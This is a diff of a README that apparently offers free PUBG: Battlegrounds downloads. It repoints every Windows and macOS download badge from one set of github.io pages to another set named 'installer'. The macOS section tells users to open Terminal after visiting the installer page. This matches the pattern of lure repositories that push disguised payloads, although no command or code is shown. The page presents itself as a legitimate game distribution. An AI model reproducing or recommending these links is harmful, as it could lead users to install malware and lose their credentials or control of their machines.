@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Download PUBG Battlegrounds](https://img.shields.io/badge/⬇_Download_PUBG%20Battlegrounds-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Download PUBG Battlegrounds](https://img.shields.io/badge/⬇_Download_PUBG%20Battlegrounds-E63946?style=for-the-badge&logo=github)](https://mixedlinkrelease.github.io/installer/)
 
 </div>
 
@@ -65,9 +65,9 @@ PUBG: Battlegrounds is the battle royale game that defined the genre, dropping 1
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://zenboulderagora.github.io/Windw/)
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://mixedlinkrelease.github.io/installer/)
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://mixedlinkrelease.github.io/installermac/)
 
 </div>
 
@@ -85,7 +85,7 @@ PUBG: Battlegrounds is the battle royale game that defined the genre, dropping 1
 
 <div align="center">
 
-[![⬇ Download PUBG Battlegrounds](https://img.shields.io/badge/⬇_Download_PUBG%20Battlegrounds-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Download PUBG Battlegrounds](https://img.shields.io/badge/⬇_Download_PUBG%20Battlegrounds-E63946?style=for-the-badge&logo=github)](https://mixedlinkrelease.github.io/installer/)
 
 </div>
 
@@ -117,7 +117,7 @@ PUBG: Battlegrounds is the battle royale game that defined the genre, dropping 1
 
 ## 🍎 macOS Installation
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://mixedlinkrelease.github.io/installermac/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -142,7 +142,7 @@ PUBG: Battlegrounds is the battle royale game that defined the genre, dropping 1
 
 <div align="center">
 
-[![⬇ Download PUBG Battlegrounds](https://img.shields.io/badge/⬇_Download_PUBG%20Battlegrounds-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Download PUBG Battlegrounds](https://img.shields.io/badge/⬇_Download_PUBG%20Battlegrounds-E63946?style=for-the-badge&logo=github)](https://mixedlinkrelease.github.io/installer/)
 
 </div>
 
